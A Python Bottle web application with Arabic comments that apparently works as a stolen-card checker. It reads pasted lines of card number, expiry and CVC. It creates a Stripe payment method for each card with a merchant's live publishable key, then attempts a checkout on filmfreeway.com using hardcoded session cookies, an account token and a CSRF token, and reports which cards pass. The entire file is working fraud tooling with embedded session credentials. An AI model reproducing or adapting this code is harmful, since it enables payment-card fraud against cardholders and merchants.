from bottle import Bottle, request, run
import requests

# إنشاء صفحة ويب باستخدام Bottle
app = Bottle()

@app.route('/', method=['GET', 'POST'])
def index():
	if request.method == 'GET':
		# عرض صفحة HTML
		with open('index.html', 'r') as file:
			return file.read()

@app.route('/delete_and_send', method='POST')
def delete_and_send():
	# الحصول على قيمة المدخل المرسل من النموذج
	text = request.forms.get('text')
	lines = text.split('\n')
	results = []  # قائمة مؤقتة لتخزين النتائج
	start_num = 0
	for P in lines:
		n = P.split('|')[0]
		mm = P.split('|')[1]
		yy = P.split('|')[2][-2:]
		cvc = P.split('|')[3].strip()

		headers = {
		'authority': 'api.stripe.com',
		'accept': 'application/json',
		'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7,ar-AE;q=0.6',
		'content-type': 'application/x-www-form-urlencoded',
		'origin': 'https://js.stripe.com',
		'referer': 'https://js.stripe.com/',
		'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
	}
	
		data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=ee340a80-ab1f-4409-b9d7-654d355dc902af2fe8&muid=aab1802b-e68b-49a1-b1e7-ed53931e145b147355&sid=752ad0a6-1ba6-46c4-876b-29d3c28fa4c5355801&payment_user_agent=stripe.js%2Fcd4fc6eb02%3B+stripe-js-v3%2Fcd4fc6eb02&time_on_page=33986&key=pk_live_Lhs7ueAHYCkTf8Geu6hD6aqh'
		
		response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
		id=(response.json()['id'])
		cookies = {
			'cf_zaraz_google-analytics_v4_4bcf': 'true',
			'google-analytics_v4_4bcf__session_counter': '1',
			'cf_zaraz_google-analytics_9d17': 'true',
			'google-analytics_9d17___ga': '984daa14-0896-42df-8574-4766a40a858a',
			'google-analytics_v4_4bcf__ga4sid': '2102224273',
			'google-analytics_v4_4bcf__ga4': '5de06859-63c3-4d86-a402-2c928146d488',
			'google-analytics_v4_4bcf___z_ga_audiences': '5de06859-63c3-4d86-a402-2c928146d488',
			'remember_user_account_token': 'BAhbCFsGaQOKHDxJIhlIak1HV0NOU2RMX1ZNWWFWU3piNQY6BkVGSSIXMTY4NzExMjg1OS42NDE1MzM0BjsARg%3D%3D--be857f19bc3691e964dcbc896f3204d13cb34a32',
			'cf_zaraz_twitter_3d9b': 'true',
			'_filmfreeway_session': 'dHkwNGF0c1FUUGVIbkp2S3dBbUpZeTZ4bzZiWFNETnVacGhXNWh0NGROTHoyV1N3KzRWM1o5dFk5L2dCcms2ZDVkUUcrcVNyUi9uU3A5MTJlWm5RUWVFVUMvaGVaendtMEhVYjYrdHBnTm1uQzZYQldqK0V1blN4Tk1LL1MwT3Z5aVdhUE9Ib3BZWlAxMUxaZEFBK3ArM1d6U2QxQnRSM2lFbTgyWUFpektoYVVnYlMxaTVjY0VUSE5VaDJTRnpVdDgwMUsvK1dwdlNDdnNZNjdOSDkzdWU4cjMvNERKaWVzZXBXQXFzRVBObXRJV1ppZW9GY00rU2UyNnBudXBMSlM3QXI3VmhTVTlEeGJXa1N0VzZ5cEtuY2l1RmtqV29hRHhhV3FlL1dReGJ5cDcxZ3Y0dW0yR0xYOGxLTG0vclFBZjlzRzhLVC9kK2FVV1cxYlg0ZEpjdkdLRkdkektMblRxVmJKV1QvMEFuVklaTnpaWEZ5UUo5MHkrZTQ0bVNDWDVWV01acjRGNmNZbTQrOXo3ZEJiVjYrMVdqeHk1Wk9JUlJIbFB1N2g2REZMMHErUCtrdVRmUkduRkFkdlVqSkZPV3R1YU5mbktpdHdaMjB5eEhTMWc9PS0teHc2eUlKY3d3WCt3UlFsczRkWTA2Zz09--2bd5b5230d34c35fb88068a1572adaf09473c074',
			'__stripe_mid': 'aab1802b-e68b-49a1-b1e7-ed53931e145b147355',
			'__stripe_sid': '752ad0a6-1ba6-46c4-876b-29d3c28fa4c5355801',
			'google-analytics_v4_4bcf__counter': '18',
			'google-analytics_v4_4bcf__let': '1687112965298',
			'google-analytics_v4_4bcf__engagementPaused': '1687112965298',
			'google-analytics_v4_4bcf__engagementStart': '1687112945103',
		}
		
		headers = {
			'authority': 'filmfreeway.com',
			'accept': '*/*',
			'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7,ar-AE;q=0.6',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			# 'cookie': 'cf_zaraz_google-analytics_v4_4bcf=true; google-analytics_v4_4bcf__session_counter=1; cf_zaraz_google-analytics_9d17=true; google-analytics_9d17___ga=984daa14-0896-42df-8574-4766a40a858a; google-analytics_v4_4bcf__ga4sid=2102224273; google-analytics_v4_4bcf__ga4=5de06859-63c3-4d86-a402-2c928146d488; google-analytics_v4_4bcf___z_ga_audiences=5de06859-63c3-4d86-a402-2c928146d488; remember_user_account_token=BAhbCFsGaQOKHDxJIhlIak1HV0NOU2RMX1ZNWWFWU3piNQY6BkVGSSIXMTY4NzExMjg1OS42NDE1MzM0BjsARg%3D%3D--be857f19bc3691e964dcbc896f3204d13cb34a32; cf_zaraz_twitter_3d9b=true; _filmfreeway_session=dHkwNGF0c1FUUGVIbkp2S3dBbUpZeTZ4bzZiWFNETnVacGhXNWh0NGROTHoyV1N3KzRWM1o5dFk5L2dCcms2ZDVkUUcrcVNyUi9uU3A5MTJlWm5RUWVFVUMvaGVaendtMEhVYjYrdHBnTm1uQzZYQldqK0V1blN4Tk1LL1MwT3Z5aVdhUE9Ib3BZWlAxMUxaZEFBK3ArM1d6U2QxQnRSM2lFbTgyWUFpektoYVVnYlMxaTVjY0VUSE5VaDJTRnpVdDgwMUsvK1dwdlNDdnNZNjdOSDkzdWU4cjMvNERKaWVzZXBXQXFzRVBObXRJV1ppZW9GY00rU2UyNnBudXBMSlM3QXI3VmhTVTlEeGJXa1N0VzZ5cEtuY2l1RmtqV29hRHhhV3FlL1dReGJ5cDcxZ3Y0dW0yR0xYOGxLTG0vclFBZjlzRzhLVC9kK2FVV1cxYlg0ZEpjdkdLRkdkektMblRxVmJKV1QvMEFuVklaTnpaWEZ5UUo5MHkrZTQ0bVNDWDVWV01acjRGNmNZbTQrOXo3ZEJiVjYrMVdqeHk1Wk9JUlJIbFB1N2g2REZMMHErUCtrdVRmUkduRkFkdlVqSkZPV3R1YU5mbktpdHdaMjB5eEhTMWc9PS0teHc2eUlKY3d3WCt3UlFsczRkWTA2Zz09--2bd5b5230d34c35fb88068a1572adaf09473c074; __stripe_mid=aab1802b-e68b-49a1-b1e7-ed53931e145b147355; __stripe_sid=752ad0a6-1ba6-46c4-876b-29d3c28fa4c5355801; google-analytics_v4_4bcf__counter=18; google-analytics_v4_4bcf__let=1687112965298; google-analytics_v4_4bcf__engagementPaused=1687112965298; google-analytics_v4_4bcf__engagementStart=1687112945103',
			'origin': 'https://filmfreeway.com',
			'referer': 'https://filmfreeway.com/cart',
			'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A325F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
			'x-csrf-token': 'CWwdM9pN+OFGa/sY30z7RAqx/xNi0PMWQCi7pIZXvWE=',
			'x-requested-with': 'XMLHttpRequest',
		}
		
		data = {
			'payment_method_id': id,
			'save_credit_card': 'true',
		}
		
		response = requests.post('https://filmfreeway.com/cart/checkout_with_token', cookies=cookies, headers=headers, data=data)
		results.append(f'[ {start_num} ]'+P+' ➜ '+response.json()['error'])  # إضافة النتيجة إلى القائمة المؤقتة

	return results # إرجاع النتائج المجمعة كنص

run(app, host='localhost', port=8080)
